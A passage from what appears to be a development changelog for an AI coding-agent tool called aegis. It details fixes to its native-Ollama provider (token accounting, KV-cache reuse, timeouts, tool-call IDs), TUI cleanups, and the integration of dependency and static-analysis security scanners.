summing per-turn `InputTokens` *is* the billable-input basis — the "prefill work done" alternative
would have made the cloud-cost number wrong. No behavior change; the chosen meaning is now stated
at each display surface: the `chatResult.InputTokens` JSON field and the text-trailer print site in
`internal/cli/chat.go` (the trailer is already gated on `TotalUSD > 0`, so it only appears for a
priced/cloud run), and the `StatusInfo.DailyTokens` doc in `internal/api/api.go`. Noted for a
future item while here: sweep the SCA/secrets scanners for non-zero exit codes that mean "nothing
to do" rather than "I broke" (the P35.6 question, which P34.6 only checked for language-targeted
tools).

### P35.10 — `InputTokens` on the native-Ollama path means "uncached prefill tokens", not "prompt size"

Filed from the same P33.9-P35.7 native-Ollama code-review pass. With P35.4's `keep_alive` residency
reusing the KV cache, Ollama's `prompt_eval_count` on a cache-hit turn counts only the *newly
evaluated* prefill tokens (a P35.7 live run: 37 after turn 1's 3944), and the native adapter maps
it straight into `usage.InputTokens`. That is arguably the truthful "prefill work done" number, but
the shift in meaning from "full prompt size" was undocumented, and anything reading `InputTokens`
as context size would be silently wrong on every cached turn.

**Resolution:** documented the semantics rather than restructuring the data model (no new
`provider.Usage` field), backed by a full audit of every `InputTokens` reader:

- **Billing / budget / work-accounting** (`internal/cost` `CostUSD` and the `Tracker`, engine
  per-run usage accumulation, the `prompt_eval_count` debug log) — **correct** under this meaning:
  "work done" *is* the right number to bill and budget against.
- **Displays** (per-turn traces, session token totals, every `in=`/`tokens` surface in the TUI and
  `aegis chat`/`sessions`/`bg`/`worker`) — **truthful understatement**: they show work done, not
  context size; no change.
- **Compaction** — already safe: the proactive per-turn check (`internal/engine/engine.go`) uses
  `conv.estimatedTokens()`, never usage. Confirmed in code.
- **The one genuine "context size" consumer** — the TUI context-fullness bar (`renderContextBar`,
  `internal/tui/tui.go`) divides `inputTokens (+cache)` by the context window, so it understates
  fullness on a native-Ollama cache-hit turn. Left display-only as-is (no compaction/cost/budget
  impact); a correct fix would need an estimated-context number the daemon doesn't currently
  surface to the UI — out of scope for an effort-S item. Flagged as the sole follow-up candidate if
  an accurate native-path fullness gauge is ever wanted.

Comments added at the mapping site (`internal/provider/ollama/ollama.go`), the `Usage.InputTokens`
doc (`internal/provider/provider.go`), and the context-bar call site (`internal/tui/tui.go`), each
cross-referencing P35.10 and the existing `PromptEvalDurationMS` note. No behavior change.

---

### P35.11 — `/status` reachability probe live-hits Ollama on every poll

Filed from the same review pass. `probeProviderReachability` (`internal/server/provider_health.go`)
fired a live `GET /api/version` at the Ollama server on every `/status` request. Locally cheap, but
the TUI/web UI poll `/status` at 1-2s, so a fast poll loop was a steady upstream request stream to
Ollama for a reachability value that changes rarely.

**Fix:** the probe result — both `reachable` and the measured `latencyMS` — is now cached for a 3s
window (`reachCacheTTL`, chosen to sit just above the UI's poll cadence: coalesces a fast loop to
one upstream request per window while still reflecting an up/down change within a poll or two). The
cache lives on the `Server` struct next to the existing `toolCallWarned` probe cache, guarded by
`reachCacheMu`. The fresh-check and the write both take the lock, but the actual probe runs
*outside* it — holding the mutex across a 2s network timeout would serialize every concurrent
`/status` behind one slow probe; a same-tick cold race where two callers both probe just writes an
equivalent fresh entry and coalesces thereafter. A `reachNow` clock seam (nil ⇒ `time.Now`) lets
tests drive expiry deterministically. Regression tests (`internal/server/provider_health_test.go`)
use a counting fake Ollama `httptest` server to assert: five polls after a warm-up hit Ollama
exactly once; advancing the clock past the TTL forces one re-probe per window; and 32 concurrent
callers against a warm cache add zero upstream hits — the last under `-race`.

---

### P35.9 — Native-Ollama tool-call IDs collide across turns: wrong `tool_name` on replayed results + KV-cache churn

Filed from a code-review pass over the whole P33.9-P35.7 native-Ollama body of work. `consume`
mints tool-use IDs from a counter that resets on every request, so an assistant turn's first tool
call is always `tu_0`, its second always `tu_1`, regardless of which turn it's in. `translate`'s
`toolNames` helper prebuilt a single ID→name map over the entire message history before emitting
any wire messages, so a later turn's `tu_0` (say, `run_shell`) silently overwrote an earlier turn's
`tu_0` (say, `read_file`) in that map — and every already-emitted-looking-up-later tool-result
message for the earlier turn resolved against the *last* writer, not the one that actually produced
it. Two consequences: the model sees tool results attributed to the wrong tool (a silent quality
regression on exactly the multi-tool agentic runs the local-model work targets), and the label
change mutates the serialized prompt bytes for the earlier turn between requests, killing Ollama's
prefix cache at the first changed byte — a full reprocess of the whole conversation on the very
mixed-tool runs P35.4's `keep_alive` residency was meant to speed up.

**Fix:** `translate` now walks messages once, updating the ID→name map as `ToolUseBlock`s are
encountered and resolving each `ToolResultBlock` against the nearest *preceding* use, instead of
building the map ahead of time over the whole history. This is correct independent of ID reuse (no
change to how `consume` mints IDs was needed), and — because it's applied at translate time rather
than at storage time — it also repairs sessions that already have colliding IDs persisted from
before the fix. Regression test `TestTranslateReusedToolIDsResolvePositionally`
(`internal/provider/ollama/ollama_test.go`) covers a two-turn fixture where turn 1 calls
`read_file` and turn 2 calls `run_shell`, both minted as `tu_0`: asserts turn 1's result keeps
`tool_name: read_file`, and asserts byte-for-byte that serializing turn 1's prefix alone is
identical to the first two wire messages of the full four-message translation — the property
Ollama's prefix cache actually depends on.

---

### P35.7 — Confirm/instrument inter-turn KV-cache reuse on the native Ollama path

P35.4 kept the model resident across turns (`keep_alive` 30m default; verified live via `ollama
ps`), on the premise that Ollama's native `/api/chat` reuses its KV-cache prefix across requests
while the model stays resident. But the P35.5 timeout — hit only after the context grew to ~62k
tokens over 5 turns — was equally consistent with prefill *not* being spared: each turn
reprocessing the whole growing conversation from scratch, prefill time climbing with context until
it crosses the response-header-timeout ceiling. This item is a root-cause diagnostic, not a fix.

**Instrumentation shipped.** Ollama's native `/api/chat` response includes `prompt_eval_duration`
(nanoseconds) alongside the already-read `prompt_eval_count` and `load_duration`.
`internal/provider/ollama/ollama.go`'s `wireChunk` gained the field, and `provider.Usage` gained
`PromptEvalDurationMS` (converted from nanoseconds, following `LoadDurationMS`'s existing
convention). `internal/engine/engine.go`'s `turn` method logs it every turn via `e.logger.Debug`
(`"prefill (prompt_eval)"`, fields `prompt_eval_count` and `prompt_eval_duration_ms`), gated only on
`PromptEvalDurationMS > 0` so it's a no-op on every non-Ollama provider. The diagnostic tell for a
live run: on turn N+1, does `prompt_eval_count` drop to roughly the newly-appended delta since turn
N (cache hit — reuse is happening) or stay at the full running conversation total (cache miss — full
reprocess every turn)?

**Code-reading pass over the three named non-determinism candidates**, none confirmed as bugs:

- **Thinking blocks round-tripped into history.** Confirmed true as stated — `engine.turn` does
  append `provider.ThinkingBlock`s into the assistant message's `Content` first (required ordering
  for Anthropic tool use), so they do live in `Conversation.Messages`. But the native-Ollama
  `translate()` function's assistant-message switch (`internal/provider/ollama/ollama.go`) has no
  `case` for `provider.ThinkingBlock` — only `TextBlock` and `ToolUseBlock` are handled — so on
  every re-serialization thinking content is silently and *consistently* dropped, not
  inconsistently rendered. Not a source of prefix drift on this adapter.
- **Tool-result formatting.** `translate()`'s `RoleUser` case emits a `role:"tool"` wire message
  straight from the stored `ToolResultBlock.Content` string with no reformatting — whatever bytes
  were written into conversation history at tool-execution time are exactly what gets re-sent on
  every subsequent turn. No bug found.
- **System prompt regenerated non-deterministically per turn.** Confirmed true that it *is*
  regenerated every turn — `Server.effectiveSystem` (`internal/server/helpers.go`) is called fresh
  on every message post, not cached across turns — but every constituent traced through: persona
  blocks (`persona.PlatformBlock` etc.) are static per-OS strings with no timestamp;
  `memory.Sources.LoadContext`/`Load` are file reads with a 5s TTL cache but no embedded
  timestamp/nonce (identical file content re-reads to identical bytes); `skills.BuildIndex` sorts by
  discovery order and is signature-cached; the deferred-tools block (`deferredToolsBlock`) and the
  exposed-tool schema list (`tool.Registry.Schemas`) are both explicitly sorted by name
  (`sort.Slice`, `internal/tool/tool.go`). Given unchanged underlying files/config, the assembled
  system prompt should render byte-identical turn over turn. No nonce, wall-clock timestamp, or
  unsorted map iteration was found anywhere in the chain.

No fix was made under this item — the pass found no clear, confident evidence of an actual
byte-mismatch bug in any of the three named candidates, and the task scope explicitly calls for not
guess-fixing speculatively. **This is a code-reading conclusion, not a live-verified one:** no
Ollama server was reachable this session to actually run a multi-turn conversation and observe
`prompt_eval_count` behavior. P35.5's underlying question — whether a longer
`response_header_timeout` or genuine prefill-cost reduction is the durable fix — remains open until
someone runs a multi-turn native-Ollama session with this instrumentation and reads the log.

Tests: `ollama_test.go`'s `TestStreamParsing` asserts `PromptEvalDurationMS` is parsed correctly
from a sample stream chunk; `engine_test.go` gained `TestRunLogsPrefillDiagnostic` (log line present
with correct fields when a provider reports `PromptEvalDurationMS`) and
`TestRunSkipsPrefillDiagnosticWhenUnreported` (no log line when it's zero, i.e. every non-Ollama
provider).

### P35.6 — Rewrap the response-header-timeout error to be actionable

When P35.5's response-header timeout fires, the surfaced error used to be the bare Go transport
string (`net/http: timeout awaiting response headers`) — indistinguishable from a dead server and
naming no remedy. P35.2 set the precedent for the other local-model failure mode (context
truncation): detect the signal, raise an actionable, correctly-(non-)retryable error naming the
lever. Same treatment here.

`internal/provider/errors.go` gained `NewResponseHeaderTimeoutError` (builds a terminal `*APIError`
explaining the likely cause — prefill on a local backend slower than the configured
`provider.response_header_timeout` budget — and naming the levers: raise that setting, lower
`context_window`, or reduce per-turn context growth) and `IsResponseHeaderTimeoutError` (matches the
transport error by its `"timeout awaiting response headers"` substring, the only signal available —
there is no HTTP status and no server-side error envelope for a header timeout). Both
`internal/provider/ollama/ollama.go` and `internal/provider/openai/openai.go` check
`IsResponseHeaderTimeoutError` at their `client.Do` error site — the same site that already called
`provider.NewTransportError` — and rewrap into the actionable error instead when it matches; the
Anthropic cloud adapter is untouched, since this is specifically the local-backend
withhold-the-header-until-prefill-finishes behavior P35.5 documented, not a general transport
failure. Non-retryable: a blind retry just re-processes the same oversized prefill and times out
again.

Tests: `ollama_test.go` and `openai_test.go` each gained
`TestResponseHeaderTimeoutRewrapped`, which drives a real header timeout through an `httptest`
server that never writes a response header, configured with a short
`WithResponseHeaderTimeout`, and asserts the returned error names both levers, does not leak the
bare transport string, and reports `Retryable() == false` through the same
`errors.As(&provider.APIError)` seam the retry layer uses.

### P35.5 — Native-Ollama agentic runs die on the shared 5-minute response-header timeout

A live `/threat-model stride` run on the doctor-recommended native-Ollama setup
(`provider.default: ollama`, qwen3.6:35b-a3b-fast, `context_window: 131072`, `keep_alive` resident
per P35.4) reproducibly died mid-exploration with `ollama: request failed: … net/http: timeout
awaiting response headers`, before writing any report file — 5 turns / 27 tool calls / ~62k input
tokens deep, further than the pre-P35.3 run but still a hard failure. Cause:
`internal/provider/sse/sse.go` hardcoded `responseHeaderTimeout = 5 * time.Minute`, shared by
*every* adapter via `NewStreamingClient` and configurable nowhere. Ollama withholds the HTTP
response header until prompt-eval (prefill) completes, so on a large local context a legitimately
slow prefill trips the cap and the whole turn aborts as a transport error.

Shipped the cheapest of the three fix options the filing named: made the timeout configurable.
`sse.NewStreamingClient` now takes a `time.Duration` (`<= 0` substitutes the unchanged
`sse.DefaultResponseHeaderTimeout`, 5 minutes) instead of reading a package constant, and each
adapter (`anthropic`, `openai`, `ollama`) gained a `WithResponseHeaderTimeout` option that rebuilds
its client with the given timeout. `ProviderConfig` gained `ResponseHeaderTimeoutSec` (`koanf:
"response_header_timeout"`, seconds) and a `ResponseHeaderTimeout()` accessor that applies the same
unset/non-positive-defaults-to-5m rule; `providerfactory.buildOne` threads
`cfg.Provider.ResponseHeaderTimeout()` into every adapter it constructs, primary and fallback alike.
Scaling the default with `context_window` (fix option b) and reducing per-turn context growth (c)
are explicitly out of scope for this item — see roadmap P35.7, which will decide whether a longer
timeout or genuine inter-turn KV-cache reuse is the durable fix. P35.6 (rewrapping the timeout error
to be actionable when it does fire) is separate follow-up work.

Tests: `sse` package covers the default/custom/negative-timeout cases directly against the built
`http.Transport`; `ollama` adds an adapter-level `WithResponseHeaderTimeout` check; `config` covers
both the accessor's default/override behavior and the env-var override
(`AEGIS_PROVIDER_RESPONSE_HEADER_TIMEOUT`) end to end through `Load()`. Documented in
`docs/providers.md` (new "Response-header timeout" section) and `docs/configuration.md`'s sample
config.

### P35.1 — `aegis chat` wires configured built-in skills into its tool registry

`internal/cli/chat.go`'s one-shot path built its tool registry via `builtin.Register(reg,
builtin.Options{...})` but omitted `BuiltinSkills: cfg.Skills.BuiltinEnabled` — a field the
daemon/TUI path (`internal/server/server.go:561`) already set. So with `threat-modeling` enabled
via `aegis skills enable threat-modeling`, `aegis chat "Load the threat-modeling skill…"` got
`no skill named "threat-modeling"` back from the model's own `skill` tool call and silently
proceeded without any of the skill's instructions. Not threat-modeling-specific: every built-in
skill was unreachable from the one-shot/scriptable CLI entry point. Fix: the one missing field,
matching `server.go`. Found live-testing the threat-modeling skill against an external repo.

### P35.2 — Context-limit truncation surfaces an actionable error, not an opaque JSON-parse failure

When a local model server (Ollama/llama-server) ran out of context partway through emitting a tool
call, it stopped with the arguments JSON cut short and returned a bare `invalid tool call
arguments for "<tool>": unexpected end of JSON input` — indistinguishable, to a caller, from a
genuinely malformed model call, and giving no hint the fix was to raise `provider.context_window`.
Reproduced live: a run died on exactly this while llama-server's own log showed `n_tokens = 65535,
truncated = 1`. That error string is entirely server-side (it exists nowhere in aegis's Go source
— grep confirms), arriving as a mid-stream `{"error":…}` envelope; on the native path the server
does the tool-call parsing itself, so the message shape is the only truncation signal available.

Fix: `provider.NewContextTruncationError` (terminal, non-retryable — retrying an over-long prompt
unchanged fails identically and only burns another prompt-eval on a slow local model) plus
`provider.IsTruncatedToolCallError`, which keys on the *premature-end-of-input* shape (`invalid
tool call arguments` + `unexpected end of JSON input`) that truncation produces, distinct from a
syntax error like `invalid character` for a genuinely malformed call. Wired into both adapters:
the native Ollama path (`internal/provider/ollama/ollama.go`) tracks `done_reason "length"` and
checks the message shape before the generic classifier; the OpenAI-compat path
(`internal/provider/openai/openai.go`) tracks `finish_reason "length"`, enriches the error-envelope
path the same way, and adds a `json.Valid` check when finalizing accumulated tool-call args — cut-off
args with a length signal yield the actionable error, a malformed call without one still yields a
plain parse error instead of silently forwarding broken JSON downstream. The new message:
`response truncated at the context limit — raise provider.context_window or reduce session history
(server error: <original>)`. Tests in both adapters cover both directions.

### P35.3 — `aegis doctor` calibrates the recommended `context_window` against the model's real max

The recommended `provider.context_window` was a hardcoded `suggestedContextWindow = 32768` in
`internal/providerfactory/legacyollama.go` (a 16GB-VRAM-safe value from P34.5) — not, as the
filing assumed, derived from the modelfile. A skill-driven workload routinely builds a >40k-token
prompt before writing any output (the threat-modeling workspace-exploration step alone produced
41,538 tokens), so that fixed ceiling made the very first real task fail with a hard Ollama 400,
no compaction attempted first — even though the model's real training-context max (e.g. 262144) is
far larger and already visible in aegis's "auto-detected Ollama context window" log line as
`model_max`.

Fix (the actionable option): new `ollamainfo.RecommendContextWindow(modelMax)` recommends half the
model's real max, capped at `RecommendedContextWindowCap` (131072, a KV-memory guard), floored at
the `BaselineContextWindow` (32768), never above the max; `modelMax <= 0` falls back to the
baseline. `LegacyOllamaCompatFix` now takes a `modelMax` argument and includes a sizing note (citing
the real max when known, an explicit skill-headroom caveat when not). `aegis doctor`'s
provider-adapter check probes `ModelMax` best-effort via a `detectOllamaInfo` seam (3s timeout,
degrades to baseline), so a 262144-token model gets a 131072 recommendation instead of 32768; the
daemon startup warn stays on the baseline since it fires before context-window detection. Tests in
`ollamainfo`, `providerfactory`, and `cli`.

### P35.4 — Incremental context reuse across turns for local-model runs

No incremental context reuse across turns made long skill runs cost-prohibitive on local models:
in the live threat-modeling dogfooding run, every additional tool round trip reprocessed the
*entire* conversation (a single prompt-processing pass took over three minutes by the 15th turn),
so per-turn cost grew with total conversation length instead of paying only for newly-added tokens.
The filing proposed two fixes; both shipped here.

**Skill half.** The threat-modeling skill's §2 workspace-exploration step now tells the model to
page large files with `read_file`'s `offset`/`limit` or a targeted `grep` for the entry points,
config, and data-access calls it actually needs, rather than pulling a whole large file into
context in one call — one whole-file read of a ~100KB single-file script ate roughly half a 65536-
token budget by itself, and every later turn repays that context. Prose-only; no Go change.

**Provider half.** Ollama's native `/api/chat` reuses its KV-cache prefix across requests
automatically, but only while the model stays resident — there is no explicit "reuse cache"
request field, so the sole adapter-level lever is `keep_alive`. Left at Ollama's own 5m idle
default, a multi-turn run whose per-turn cost outlasts that window unloads the model between turns
and wipes the cache, forcing the from-scratch reprocessing measured above. `providerfactory.buildOne`
now substitutes a bounded resident default (`defaultOllamaKeepAlive`, 30m) when `provider.keep_alive`
is unset, so the model stays loaded across a run's inter-turn gaps and reuses its cache, while still
unloading once a run goes genuinely idle — RAM is held only during active work, reconciling the KV
reuse win with the limited-RAM concern that made P33.10 keep `keep_alive` opt-in. An explicit config
value still wins, including `"-1"` (pin forever) and `"0"` (unload immediately). The adapter itself
is unchanged (it still omits `keep_alive` when the option isn't passed — policy lives in the
factory). Tests in `providerfactory` assert the unset→30m substitution and explicit-value
passthrough; the config doc and `docs/providers.md` are updated.

### P33.21 — Editor/background surfaces now use `KindToolCallStart`

P33.3 added `provider.EventToolUseStart` → `KindToolCallStart` and wired it through the engine, the
api wire, and the TUI, but `internal/acp/agent.go` and `internal/cli/bg.go` ignored the new kind.

Fix: `internal/acp/agent.go`'s `streamEvents` now handles `api.KindToolCallStart` by opening a
tracker entry and sending an ACP `toolCall` notification with `status: "pending"` (a new
`statusPending` constant in `protocol.go`) — the "preparing `read_file`…" affordance Zed/Neovim can
render immediately, before the model has finished streaming the call's arguments. The following
`api.KindToolCall` for the same call now looks up that pending entry via `tracker.current` and
sends a `toolCallUpdate` (status `in_progress`, carrying the real `RawInput`) that reuses the same
ID, instead of opening a second tool call; a daemon that never emits `KindToolCallStart` leaves
`tracker.current` empty and `KindToolCall` falls back to its old behavior of opening a fresh call
directly. `internal/cli/bg.go`'s `events` dump — a one-shot replay of a background session's
buffered events, not a live stream — now prints a `[tool-start]` line for the same kind, giving the
trace the same earlier timestamp without duplicating the existing `[tool]` line.

Tested: new `TestPromptToolCallStartReconciles` in `internal/acp/agent_test.go` asserts exactly one
`toolCall` (pending) followed by two `toolCallUpdate`s (in_progress reusing the same ID, then
completed); `go build ./...`, `go vet ./...`, and `go test ./...` (61 packages) green.

---

### P33.22 — Rename `escPending` to `backtrackArmed`

After P33.5, `escPending` was written by exactly one path (arming the idle backtrack picker) but
was still cleared defensively in several send/stream-start handlers. The flag was no longer about
"an Esc is pending" in general — pure naming cleanup, renamed to `backtrackArmed` throughout
`internal/tui` (the field, its doc comment, all read/write sites in `tui.go`, and the existing
`backtrack_esc_test.go`/`interrupt_esc_test.go` coverage). No behavior change.

Tested: `go build ./...`, `go vet ./...`, and `go test ./...` (61 packages) green.

---

### P33.12 — Composite the wizard and security-config forms as overlays

Both `wizardModel.view()` and `securityConfigModel.view()` built their bordered panel and then
called `lipgloss.Place(width, height, Center, Center, panel)` themselves, filling the whole frame
and replacing `render()`'s output outright. Every other dialog (approval, transient panels, the
filterable-list pickers, the completion popup) instead builds just its own panel/box and lets
`render()` composite it over `renderChat()`'s output via `renderOverlay`/`renderAnchoredOverlay`,
so the live transcript keeps its place underneath and closing the dialog doesn't reflow anything.

Fix: both `view()` methods now return the bare bordered panel (drop the `lipgloss.Place` call), and
`render()` centers each over `m.renderChat()` with `renderOverlay` — identical to how it already
handles `m.approval`, `m.dialog`, and `m.transientPanel`. No behavior change to the forms
themselves (huh form flow, phases, save logic all untouched); this only changes how the panel is
positioned on screen. `width`/`height` fields on both models became dead (they were only read by
the removed `lipgloss.Place` call) but are left in place since `tui.go`'s resize handling still
assigns them and removing the fields isn't part of this item's scope.

Tested: `go build ./...`, `go vet ./...`, and `go test ./...` (all 61 packages) green, including
`internal/tui`'s existing wizard/security-config coverage.

---

### P34.11 — grype reinstated into the multiscanner image, with `dir:` build-artifact exclusion

The parked item was conditional: it would activate only if grype were re-added to the shared image
"for some *other* reason." Tool centralization was that reason — grype had stayed a registered
scanner that only ran via a host install, the one SCA tool not covered by the one-build-and-go
image. Reinstating it carried the exact fix P34.11 reserved.

**The image side.** grype is a static binary, so it joins the **core** profile beside trivy and
osv-scanner: pinned + checksum-verified in `fetch.sh` (v0.116.0), COPYed into `profile-core`, and
removed from `multiscannerExcludedTools`. Its vulnerability DB — the ~1.8GB item that was the
original reason for exclusion — lives in the `aegis-scanner-cache` volume exactly like trivy's and
osv's, not baked into the image: `update-db.sh` runs `grype db update`, and the image sets
`GRYPE_DB_AUTO_UPDATE=false` / `GRYPE_DB_VALIDATE_AGE=false` so scans read the cached DB under
`--network none` rather than reaching for a refresh. grype is a third instance of the osv-scanner
empty-cache failure shape (a missing DB yields "0 vulnerabilities," not an error), so it joins
`multiscannerDBTools` and is gated on `/cache/grype/db/6/vulnerability.db` before it runs — the `6`
tracks grype's DB `ModelVersion` and must move with any grype bump that changes the schema major.
Image scanning by reference (`grype <ref>`) stays host-only; only source SCA (`grype dir:/src`)
runs in the image.

**The exclusion (the actual P34.11 fix).** P34.8 measured grype at 55 findings on this repo where
trivy found 0 vulns, and classified them: 48 of 55 were gitignored compiled `.exe` build artifacts,
almost all `stdlib` CVEs the go1.25.0 toolchain baked into the binaries — because `syft` catalogs a
compiled executable's embedded module list (574 Go components against go.mod's 67). The fix is a
shared `--exclude` glob list (`scaBuildArtifactExcludes`) of compiled-binary extensions, applied to
**both** grype `dir:` paths (container + host fallback) **and** the syft SBOM generation the primary
path is fed from — so the persisted SBOM is clean at the source too. Manifests (`go.mod`,
`package-lock.json`) are not binaries, so real dependency coverage (the goldmark `GO-2026-5320`
finding from go.mod) is untouched while the machine-dependent binary-catalog noise disappears. The
honest limitation, noted in code: an extensionless Unix `go build` output can't be matched by a
portable glob; the measured noise here was Windows `.exe` cross-build output, and build dirs are
conventionally gitignored for the extensionless case.

**Verified.** `go build ./...` and `go test ./internal/security/... ./internal/server/...
./internal/cli/...` green; new assertions lock in grype's presence in core, its removal from the
excluded set, its DB-cache gating, and that the exclude args cover `./**/*.exe`. Not verified in
this environment: the actual image build and a live grype scan (needs a container runtime and the
~1.8GB DB download) — the DB marker path and the `grype db update` layout were confirmed against
grype v0.116.0's source (`ModelVersion = 6`, `VulnerabilityDBFileName = "vulnerability.db"`,
`DBDirectoryPath = DBRootDir/<ModelVersion>`) rather than by running it.

---

### P34.12 — osv-scanner's exit-128 refusal needed two-way disambiguation, not a one-way mapping

Filed by the P34.9/P34.10 batch on its way out (see below), P34.12 fit the now-familiar P34.6
shape — brakeman's "Please supply the path to a Rails application", trivy's silent dev-dep skip,
now osv-scanner's `error: exit status 128` on any tree with no dependency manifest, all a scanner's
accurate refusal reaching the report as a broken tool. The item's own filing had already reproduced
the mechanism against the pinned osv-scanner 2.4.0 with Aegis's exact args, ruled out the tempting
wrong guess (128 is git's code too, but the exit reproduces identically before and after `git
init`), and proposed the fix: teach `osv-scanner`'s `Scan` branch that exit 128 with empty stdout
means zero findings.

**That fix was half right, and the half that was wrong is the interesting part.** Re-verifying
against the same osv-scanner binary turned up a second producer of the identical exit 128 with
empty stdout: a tree whose only candidate manifest exists but fails to parse (a corrupt
`package-lock.json`) hits the same code path, logging `Error during extraction: ...` per failed
file before the same closing `No package sources found` line. Collapsing exit 128 straight to "zero
findings" would have silently converted that case — a repo with real dependencies whose lockfile is
broken — into a clean SCA scan, which is a worse outcome than the error row it replaces and exactly
the failure mode the item's own filing flagged as the risk of a `RelevanceChecker` manifest
allowlist (drift causing a skipped scan on a repo that had dependencies all along). The manifest
allowlist was rejected for that risk; a bare exit-code mapping would have reintroduced it by a
different door.

The fix (`internal/security/osv.go`) keys on osv-scanner's own stderr, not a guess: 128 with no
`Error during extraction:` line is the benign case (nil error, zero findings); 128 with one or more
of those lines is surfaced as an error naming the file(s) that failed to parse. `interpretOSVError`
sits between both runners (`runJSON` host path, `runScannerImage`/`runContainerCLI` container path)
and the existing `parseOSVScanner`, using `errors.As` so it also unwraps the container path's
`fmt.Errorf("%w", ...)` wrapping. The container path's agreement with the host was measured, not
assumed (the item's own stated gap): built and ran the multiscanner image directly against both a
lockfile-less tree and a corrupt-lockfile tree, matching exit 128 in both cases. Also measured:
`--recursive` on a JS project with only a `package.json` and no lockfile at all, and one whose
lockfile's `packages` object has only the root entry — both hit exit 128 the same way. Pinned with
table-driven tests exercising a real `*exec.ExitError` (built via a helper-process re-exec, not a
`sh -c "exit N"` shell dependency — P34.7's lesson that a test asserting what the host happens to
have is testing the host) across both the bare and container-wrapped shapes, plus the pass-through
cases (127 and other real failures, and non-`*exec.ExitError` errors like a missing binary).

---

### P34.9, P34.10 — the last two Tier 2 items: scanner scope that was quietly narrower than reported

Both items were filed by the P34.5-P34.8 batch on its way out, and both were about a scanner
covering less than the report implied. `go build ./...`, `go vet ./...`, `go test ./...` green,
and both fixes driven through the real `aegis scan` binary rather than only the suite.

**P34.9's symptom was real and its diagnosis was wrong — the fourth consecutive item to fit that
shape, and the first where the *specified* fix was the one that would have failed.** The item said
njsscan crashes on Windows "because semgrep isn't supported there", and offered gating on semgrep's
availability as a candidate fix. Semgrep 1.168.0 runs fine on this Windows host (verified: it
scanned a JS file, exit 0, real results — and Aegis's own semgrep scanner uses it there). The real
mechanism is in njsscan's engine: `libsast/core_sgrep/helpers.py` opens `invoke_semgrep` with
`if platform.system() == 'Windows': return None`, an unconditional early return that never asks
whether semgrep exists, and `SemanticGrep.format_output` then calls `.get()` on that `None` →
`AttributeError`. So the item's preferred gate would have found semgrep present, allowed the run,
and reproduced the identical traceback. Believing the diagnosis had a second cost available: it
implicates semgrep-on-Windows generally, which would have wrongly gated Aegis's working semgrep
scanner too.

The fix gates the **host method**, not the tool. New `ScannerDescriptor.HostBroken` (GOOS → reason)
marks a host binary that is present but cannot work on a platform — distinct from "not installed"
(fixable) and from `RelevanceChecker` (about the workspace, not the platform), and invisible to
`lookPath`, which only proves a file exists. `Resolve` treats a HostBroken platform as "no host
binary", so the default `auto` falls through to the container — which is Linux and unaffected. This
answers the item's own objection that a blanket skip would be "its own kind of lie... the container
method runs it fine on the same machine": nothing is skipped, it's rerouted. Only an explicit
`method: host` fails, reporting the reason and the way out instead of a traceback. Keyed by GOOS
rather than probed because the breakage *is* a hardcoded platform branch in the tool.

Verified end-to-end on the item's own scenario: a plain `aegis scan .` on a JS project, where
language auto-detection enables njsscan (so `EnabledExplicit` is false and the operator never asked
for it), now reports `njsscan (container)` with 2 real findings where it previously produced a
Python traceback as an error row. njsscan's Windows `Install` entry is gone too — `pipx install
njsscan` there installs precisely the binary HostBroken then refuses to run.

**That last removal exposed a latent bug of the "which surfaces does it name vs merely happen to
cover" shape** (the FIND-14/FIND-17 pattern, recorded in [roadmap.md](roadmap.md#status)):
`InstallCommand`'s Windows→WSL install fallback was never gated on `WSLCapable`, but `Resolve` only
ever offers `MethodWSL` to a WSLCapable tool. Every tool lacking a Windows install entry happened to
be WSLCapable, so the gap was unreachable rather than absent — njsscan would have been the first
tool to fall through it, into a WSL install no scan could reach. Now gated, in `InstallCommand` and
`NoGuidedInstallReason` both. The existing `TestInstallCommandWSLFallback` fixture claimed to model
"opengrep/kubescape's actual shape" while omitting the `WSLCapable` both real descriptors set; it
passed only because the code didn't check the field, and now matches the shape it names.

The item's cheap follow-on question — does bandit share the Windows dependency? — was checked:
no. Bandit writes valid SARIF and exits 0 on a Windows host, mixed-language tree included.

**P34.10's numbers were exactly right**, including its claim that the gap currently costs nothing:
trivy's `fs` mode skips npm dev dependencies by default, so this repo's frontend lockfile catalogs
**1 of 140** packages (139 devDependencies + preact), and all 140 have zero known vulnerabilities
today. `trivyScanArgs` now passes `--include-dev-deps`.

**The measurement the item asked for is what decided it, and it inverted the trade the item
described.** The case for trivy's default is that dev deps don't ship, so their CVEs are lower
severity — but osv-scanner already includes dev deps unconditionally, so those findings reach the
report either way. The default bought no quiet; it only made the two SCA scanners disagree about
scan scope and left an ecosystem covered by one of them alone. Measured against a lockfile with
known-vulnerable dev deps (lodash 4.17.15, minimist 1.2.0): trivy reports **0** by default and
**9** with the flag, including a CRITICAL (CVE-2021-44906) that osv-scanner was already reporting
by itself. Driven through the real binary, the two scanners' findings **dedup** — 4 raw findings
became 2 reported, tagged `[also flagged by: Trivy]` — so the flag buys corroboration on the
exact path P34.8 had just fixed, at no cost in report volume. The scope decision is documented in
[docs/security_scan.md](../docs/security_scan.md) under "SCA scope", per the item's request that
the two scanners agree and that the answer be written where a user can find it.

Both fixes are pinned by host-independent tests. The `HostBroken` rule is asserted through a new
`hostGOOS` seam (P34.7's lesson — a test that asserts what the host happens to be is testing the
host, not the rule), with `Binary: "go"` fixtures so the rule is proven to beat a real `lookPath`
hit rather than passing because no binary was found.

**Filed from this batch's own findings: P34.12** — osv-scanner exits 128 with empty stdout on any
tree with no dependency lockfile, which `runJSON` (which tolerates a non-zero exit only when output
was produced) turns into `osv-scanner: error: exit status 128`. Found by driving the real binary
for P34.9, on a scratch JS project that happened to have no lockfile. It's P34.6's shape a third
time — an accurate refusal rendered as a broken tool — and it's filed with the mechanism verified
rather than assumed, including the wrong guess it rules out: 128 is git's error code too, but this
reproduces identically before and after `git init`.

---

### P34.5-P34.8 — the Tier 2 batch: three wrong diagnoses and a dedup bug

Four dependency-free items, implemented by four parallel sub-agents each in its own git worktree,
then merged into `main` one at a time — the same pattern as the P33.13-P33.18 batch, and again
zero conflicts despite P34.5 and P34.7 both editing `internal/cli/doctor.go` and P34.6 and P34.8
both editing `internal/security/scanners.go`. Worktree isolation kept the concurrent edits off
each other on disk; git's merge resolved them at integration time. `go build ./...`,
`go vet ./...`, `go test ./...` green after every merge, plus `-race` on `internal/security`.

**The batch's headline is not any one fix — it's that three of the four items were wrong about
their own mechanism, and the specified fix would have failed in two cases.** Details per item
below. The pattern is recorded in [roadmap.md](roadmap.md#status): the *symptoms* were all real
